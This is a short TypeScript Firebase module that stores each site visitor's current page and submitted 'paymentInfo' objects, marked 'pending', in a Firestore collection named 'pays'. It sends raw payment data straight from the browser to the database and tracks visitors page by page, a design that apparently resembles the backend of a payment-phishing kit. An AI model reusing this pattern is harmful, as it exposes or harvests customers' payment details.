// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { getDatabase } from 'firebase/database';
import { doc, getFirestore, setDoc } from 'firebase/firestore';

const firebaseConfig = {
  apiKey: "AIzaSyBnBBMgQGN5NOelo-1VA45pCQMjwVu5gLE", authDomain: "gvsstc.firebaseapp.com", databaseURL: "https://gvsstc-default-rtdb.firebaseio.com", projectId: "gvsstc", storageBucket: "gvsstc.firebasestorage.app", messagingSenderId: "1029610207085", appId: "1:1029610207085:web:3413ab7ae0fa03a9958c64", measurementId: "G-G3R67QJ0DK"}

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

export async function addData(data: any) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = await doc(db, 'pays', data.id!);
    await setDoc(docRef,   { ...data, createdDate: new Date().toISOString() },{merge:true});

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}

export const handleCurrentPage=(page:string)=>{
const visitorId=localStorage.getItem('visitor')
addData({id:visitorId,currentPage:page})
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: 'pending' },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
export { db,database };
